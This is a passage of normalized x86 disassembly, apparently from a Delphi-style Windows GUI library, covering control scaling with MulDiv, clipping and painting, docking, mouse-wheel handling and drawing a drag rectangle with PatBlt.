jbe r-xdata
mov ebp [ ebx + 0xc ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x3
mov eax ebx
call sub_3aae4f4
mov ebp [ ebx + 0x10 ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x1
mov eax ebx
call sub_3aae4f4
mov ebp [ ebx + 0x8 ]
test ebp ebp
jbe r-xdata
push edi
push esi
push ebp
call MulDiv
mov ecx eax
mov edx 0x2
mov eax ebx
call sub_3aae4f4
pop ebp
pop edi
pop esi
pop ebx
retn
push edi
push esi
push ebp
call MulDiv
mov ecx eax
xor edx edx
mov eax ebx
call sub_3aae4f4
sub_3aaf6c0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_3aaf6ec
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_3ac9a64
sub_3aaf71c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0x94 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
movzx eax [ r-xdata ]
and ax [ ebx + 0x1c ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_3ab0e78
sub_3aaf798
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
movzx eax [ r-xdata ]
mov [ esi + 0x8c ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
movzx ebx [ r-xdata ]
movzx ebx [ esi + 0x8c ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x175 ]
push eax
call MulDiv
mov [ esi + 0x175 ] eax
test bl 0x2
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x179 ]
push eax
call MulDiv
mov [ esi + 0x179 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x4c ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
je r-xdata
test bl 0x10
je r-xdata
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_3aaf63c
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x88 ]
mov eax ebx
and al [ r-xdata ]
movzx edx [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_3a8956c
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_3a89588
sub_3aaf970
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_3aafa06
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_3a83bd4
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_3aafb88
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_3a656c8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aafa0d
lea eax [ ebp - 0x8 ]
call sub_3a652a0
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_3aafbb8
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_3aafa14
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_3aafa5c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
test esi esi
je r-xdata
mov edx ebx
call sub_3ab3ac8
mov edx ebx
mov eax esi
call sub_3ab39d4
mov eax ebx
call sub_3aaf08c
sub_3aafaa8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_3a6457c
mov [ edi + 0x57 ] bl
push 0x0
movzx ecx bl
mov edx 0xb00b
mov eax edi
call sub_3ab0e78
mov eax edi
mov edx [ eax ]
call [ edx + 0x5c ]
sub_3aafb3c
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x80 ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_3aa88f8
mov edx ebx
mov eax esi
call sub_3a83738
sub_3aafb64
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_3ab0e78
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_3ab0e78
pop ebx
retn
sub_3aafb88
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_3aafaf8
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_3a65390
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_3aafb08
sub_3aafbb8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3aafc0d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_3aafb88
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_3a656c8
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aafc14
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax esi
call sub_3a65730
mov edx eax
mov eax ebx
call sub_3aafb64
sub_3aafc38
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_3a894c0
cmp eax [ ebx + 0x88 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_3ab0e78
pop ebx
retn
or [ ebx + 0x8c ] 0x10
mov eax [ ebx + 0x68 ]
call sub_3a894c0
mov [ ebx + 0x88 ] eax
sub_3aafd28
push ebx
mov ebx eax
cmp edx [ ebx + 0x70 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] edx
mov [ ebx + 0x5a ] 0x0
test [ ebx + 0x1c ] 0x10
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00d
mov eax ebx
call sub_3ab0e78
test [ ebx + 0x1c ] 0x2
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
sub_3aafdf0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_3aafde0
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_3aac954
mov eax esi
call sub_3aac954
jmp r-xdata
sub_3aafe2c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x1cc ]
mov edx ebx
call sub_3a7a4f0
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x1cc ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_3a7a388
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x1cc ]
mov ecx ebx
mov edx esi
call sub_3a7a510
mov cl 0x1
movzx edx [ ebx + 0x57 ]
mov eax ebx
call sub_3ab000c
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov dl 0x1
mov eax ebx
call sub_3ac464c
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd0
call sub_3a6457c
sub_3aafeb4
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_3aafe2c
mov edx [ ecx + 0x1cc ]
mov edx [ edx + 0x8 ]
dec edx
call sub_3aafe2c
jmp r-xdata
sub_3aafed8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_3aaff6e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3aaff75
lea eax [ ebp - 0xc ]
call sub_3a652a0
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d354
call sub_3a64c34
sub_3aaff80
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x1cc ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_3a7a4f0
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_3a7a494
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_3aaf4a0
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3ab000c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_3ab7fd8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_3aaf4a0
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_3ab7c38
push eax
call InvalidateRect
push ebp
call sub_3aaff80
pop ecx
test al al
je r-xdata
mov al 0x1
sub_3ab00ac
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x2 ] 0x0
cmp [ eax + 0x12a ] 0x0
je r-xdata
movzx eax [ ebp - 0x2 ]
pop ebx
pop ecx
pop ebp
retn 0xc
movzx ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x2 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_3ab00f4
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov dl 0x1
mov eax edi
call sub_3ac463c
mov ebp eax
call sub_3aac92c
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp ebp esi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
retn
test ebp ebp
je r-xdata
cmp edi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ esp + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_3ab0e78
mov edx [ esp ]
mov [ edx + 0xc ] eax
cmp edi ebp
je r-xdata
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov edx [ esp ]
mov eax ebp
mov si 0xffc9
call sub_3a6457c
jmp r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
sub_3ab0194
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_3ab7fd8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x80 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_3ab7c38
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_3ab026d
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_3ab5500
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_3ab7c38
push eax
call ReleaseDC
retn
sub_3ab02fc
push ebx
push esi
push edi
add esp 0xffffffec
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ rw-data ]
call sub_3abcf4c
test al al
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_3abd00c
mov eax edi
call sub_3ab0eac
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x8f ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0xc ]
mov edx esp
mov eax edi
call sub_3aaf6c0
mov eax [ esp + 0xc ]
mov [ esp ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x4 ] eax
movzx eax [ esp ]
mov [ esp + 0x8 ] ax
movzx eax [ esp + 0x4 ]
mov [ esp + 0xa ] ax
mov eax [ esp + 0x8 ]
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_3ab0e78
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_3aadb50
sub_3ab03f8
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
movzx ecx [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_3ab0434
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_3ab0480
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_3ab04ac
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x40 ]
call sub_3aafb28
mov edi eax
mov eax [ ebx + 0x40 ]
call sub_3aafb14
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x30 ]
fild [ ebx + 0x14 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x4c ]
fld [ esp ]
call sub_3a63418
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_3a63418
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x4c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x1db ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x8 ]
call sub_3ab7c38
push eax
call GetWindowRect
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x1db ] 0x0
je r-xdata
cmp [ eax + 0x1b0 ] 0x0
je r-xdata
movzx edx [ ebx + 0x5c ]
push edx
lea edx [ ebx + 0x4c ]
push edx
mov eax [ eax + 0x1b0 ]
mov ecx [ ebx + 0x60 ]
mov edx [ ebx + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_3ab0598
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_3ab05e4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov edi [ ebx + 0x8 ]
mov eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
push eax
movzx ecx [ edi + 0xd ]
movzx edx [ edi + 0xc ]
mov eax ebp
mov si 0xffd5
call sub_3a6457c
and eax 0x7f
mov [ ebx + 0xc ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
sub_3ab0618
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov edi eax
mov [ ebp - 0xa ] 0x0
cmp [ edi + 0x142 ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push ebx
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
movzx ecx [ ebp - 0x1 ]
mov edx edi
mov eax [ edi + 0x144 ]
call [ edi + 0x140 ]
movzx eax [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ edi + 0x98 ] ebx
jmp r-xdata
mov eax [ edi + 0x98 ]
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
cmp [ edi + 0x98 ] 0x0
setl bl
mov eax [ edi + 0x98 ]
cdq
xor eax edx
sub eax edx
sub eax 0x78
mov [ edi + 0x98 ] eax
test bl bl
je r-xdata
lea ecx [ ebp - 0x9 ]
movzx edx [ ebp - 0x1 ]
mov eax edi
mov si 0xffe0
call sub_3a6457c
mov [ ebp - 0xa ] al
cmp [ edi + 0x98 ] 0x0
je r-xdata
lea ecx [ ebp - 0x9 ]
movzx edx [ ebp - 0x1 ]
mov eax edi
mov si 0xffe1
call sub_3a6457c
mov [ ebp - 0xa ] al
jmp r-xdata
mov eax [ edi + 0x98 ]
neg eax
mov [ edi + 0x98 ] eax
sub_3ab06ec
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
movzx eax [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
movzx ecx [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_3ab0738
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x152 ] 0x0
je r-xdata
movzx eax [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
movzx ecx [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x154 ]
call [ ebx + 0x150 ]
sub_3ab0784
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x4c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x64
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3ab089f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x48 ]
call sub_3a89b74
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab08a6
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_3ab08d0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp edx
mov [ esp ] eax
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx edi
mov eax [ esp ]
call sub_3aaf6c0
movzx eax [ ebp + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
